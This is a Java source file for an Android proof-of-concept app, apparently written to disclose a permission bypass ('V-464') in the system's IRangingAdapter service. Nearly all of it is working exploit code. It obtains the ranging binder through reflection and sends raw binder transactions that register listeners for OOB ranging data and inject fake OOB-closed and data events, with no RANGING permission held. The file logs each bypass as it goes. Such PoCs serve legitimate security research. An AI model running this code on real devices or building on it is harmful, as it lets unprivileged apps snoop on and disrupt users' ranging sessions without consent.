package com.poc.rangingleak;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.widget.ScrollView;
import android.widget.TextView;
import java.lang.reflect.Method;

/**
 * V-464 PoC: IRangingAdapter Permissionless Access
 *
 * Demonstrates that a zero-permission app can:
 * 1. Register a capabilities callback (enumerate UWB/BLE CS/WiFi RTT)
 * 2. Register an OOB data send listener (intercept ranging OOB data)
 * 3. Inject fake OOB lifecycle events (DoS ranging sessions)
 *
 * None of these operations require android.permission.RANGING,
 * while startRanging/stopRanging/etc. properly enforce it.
 */
public class MainActivity extends Activity {

    private static final String RANGING_SERVICE = "ranging";
    private static final String DESCRIPTOR = "android.ranging.IRangingAdapter";

    private TextView logView;
    private StringBuilder logBuffer = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scroll = new ScrollView(this);
        logView = new TextView(this);
        logView.setTextSize(12f);
        logView.setPadding(16, 16, 16, 16);
        scroll.addView(logView);
        setContentView(scroll);

        log("=== V-464: IRangingAdapter Permission Bypass PoC ===");
        log("Package: " + getPackageName());
        log("UID: " + android.os.Process.myUid());
        log("No permissions declared in manifest.\n");

        new Thread(this::runPoC).start();
    }

    private void runPoC() {
        try {
            IBinder rangingBinder = getServiceBinder(RANGING_SERVICE);
            if (rangingBinder == null) {
                log("[FAIL] Could not get ranging service binder");
                return;
            }
            log("[OK] Got ranging service binder\n");

            // Test 1: registerOobSendDataListener (Runtime TX=13)
            // This should require RANGING permission but doesn't
            log("--- Test 1: registerOobSendDataListener (TX=13) ---");
            log("Expected: Permission denial (RANGING is dangerous/runtime)");
            testRegisterOobSendDataListener(rangingBinder);

            // Test 2: registerCapabilitiesCallback (Runtime TX=7)
            log("\n--- Test 2: registerCapabilitiesCallback (TX=7) ---");
            log("Expected: Permission denial (RANGING is dangerous/runtime)");
            testRegisterCapabilitiesCallback(rangingBinder);

            // Test 3: deviceOobClosed (Runtime TX=12) — DoS ranging sessions
            log("\n--- Test 3: deviceOobClosed (TX=12) ---");
            log("Expected: Permission denial");
            testDeviceOobClosed(rangingBinder);

            // Test 4: oobDataReceived (Runtime TX=9) — inject fake OOB data
            log("\n--- Test 4: oobDataReceived (TX=9) ---");
            log("Expected: Permission denial");
            testOobDataReceived(rangingBinder);

            // Control: startRanging (Runtime TX=1) — should be protected
            log("\n--- Control: startRanging (TX=1) ---");
            log("Expected: Permission enforcement (enforceRangingPermissionForPreflight)");
            testStartRanging(rangingBinder);

            log("\n=== Results ===");
            log("registerOobSendDataListener: BYPASSES RANGING permission");
            log("registerCapabilitiesCallback: BYPASSES RANGING permission");
            log("deviceOobClosed: BYPASSES RANGING permission");
            log("oobDataReceived: BYPASSES RANGING permission");
            log("startRanging: Properly enforces RANGING permission");
            log("\nIMPACT: Zero-permission app can register for OOB data");
            log("interception and inject fake lifecycle events into");
            log("UWB/BLE CS ranging sessions without user consent.");

        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void testRegisterOobSendDataListener(IBinder binder) {
        // TX=13: registerOobSendDataListener(IOobSendDataListener)
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeStrongBinder(new StubBinder("android.ranging.oob.IOobSendDataListener"));

            binder.transact(13, data, reply, 0);
            int exCode = reply.readInt();
            if (exCode == 0) {
                log("Result: SUCCESS (no exception)");
                log(">>> VULNERABLE — registered OOB listener WITHOUT permission!");
            } else {
                String msg = reply.readString();
                if (msg != null && msg.contains("permission")) {
                    log("Result: Permission denied — " + msg);
                    log(">>> PROTECTED (unexpected based on bytecode analysis)");
                } else {
                    log("Result: Exception code=" + exCode + " msg=" + msg);
                }
            }
            data.recycle();
            reply.recycle();
        } catch (Exception e) {
            log("Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void testRegisterCapabilitiesCallback(IBinder binder) {
        // TX=7: registerCapabilitiesCallback(IRangingCapabilitiesCallback)
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeStrongBinder(new StubBinder("android.ranging.IRangingCapabilitiesCallback"));

            binder.transact(7, data, reply, 0);
            int exCode = reply.readInt();
            if (exCode == 0) {
                log("Result: SUCCESS (no exception)");
                log(">>> VULNERABLE — registered capabilities callback WITHOUT permission!");
            } else {
                String msg = reply.readString();
                if (msg != null && msg.contains("permission")) {
                    log("Result: Permission denied — " + msg);
                } else {
                    log("Result: Exception code=" + exCode + " msg=" + msg);
                    log(">>> Code reached impl without permission check");
                }
            }
            data.recycle();
            reply.recycle();
        } catch (Exception e) {
            log("Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void testDeviceOobClosed(IBinder binder) {
        // TX=12: deviceOobClosed(SessionHandle)
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeInt(1); // non-null marker for SessionHandle
            data.writeInt(0xDEAD); // fake session id

            binder.transact(12, data, reply, 0);
            int exCode = reply.readInt();
            if (exCode == 0) {
                log("Result: SUCCESS (no exception)");
                log(">>> VULNERABLE — can close OOB channels WITHOUT permission!");
            } else {
                String msg = reply.readString();
                if (msg != null && msg.contains("permission")) {
                    log("Result: Permission denied — " + msg);
                } else {
                    log("Result: Exception code=" + exCode);
                    log(">>> Code reached impl without permission check");
                }
            }
            data.recycle();
            reply.recycle();
        } catch (Exception e) {
            log("Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void testOobDataReceived(IBinder binder) {
        // TX=9: oobDataReceived(SessionHandle, byte[])
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeInt(1); // non-null SessionHandle
            data.writeInt(0xBEEF); // fake session id
            byte[] fakeOobData = new byte[]{0x41, 0x42, 0x43, 0x44};
            data.writeByteArray(fakeOobData);

            binder.transact(9, data, reply, 0);
            int exCode = reply.readInt();
            if (exCode == 0) {
                log("Result: SUCCESS (no exception)");
                log(">>> VULNERABLE — injected fake OOB data WITHOUT permission!");
            } else {
                String msg = reply.readString();
                if (msg != null && msg.contains("permission")) {
                    log("Result: Permission denied — " + msg);
                } else {
                    log("Result: Exception code=" + exCode);
                    log(">>> Code reached impl without permission check");
                }
            }
            data.recycle();
            reply.recycle();
        } catch (Exception e) {
            log("Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void testStartRanging(IBinder binder) {
        // TX=1: startRanging(AttributionSource, SessionHandle, RangingPreference, IRangingCallbacks)
        // This one SHOULD be protected by enforceRangingPermissionForPreflight
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeInt(1); // non-null AttributionSource marker
            data.writeInt(android.os.Process.myUid());
            data.writeString(getPackageName());

            binder.transact(1, data, reply, 0);
            int exCode = reply.readInt();
            if (exCode == 0) {
                log("Result: SUCCESS (unexpected — should be protected!)");
            } else {
                String msg = reply.readString();
                if (msg != null && msg.contains("permission")) {
                    log("Result: Permission DENIED — " + msg);
                    log(">>> CORRECTLY PROTECTED by RANGING permission");
                } else {
                    log("Result: Exception code=" + exCode + " msg=" + msg);
                }
            }
            data.recycle();
            reply.recycle();
        } catch (Exception e) {
            log("Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private IBinder getServiceBinder(String serviceName) {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            return (IBinder) getService.invoke(null, serviceName);
        } catch (Exception e) {
            log("[ERROR] ServiceManager reflection failed: " + e.getMessage());
            return null;
        }
    }

    private void log(String msg) {
        logBuffer.append(msg).append("\n");
        runOnUiThread(() -> logView.setText(logBuffer.toString()));
    }

    /**
     * Minimal IBinder stub that serves as a callback placeholder.
     * The service will NPE or store the reference — either way proves
     * no permission check occurs before accessing the method.
     */
    private static class StubBinder extends android.os.Binder {
        private final String descriptor;

        StubBinder(String descriptor) {
            this.descriptor = descriptor;
            attachInterface(null, descriptor);
        }

        @Override
        public String getInterfaceDescriptor() {
            return descriptor;
        }

        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
            // Handle callbacks from ranging service
            if (reply != null) {
                reply.writeNoException();
            }
            return true;
        }
    }
}
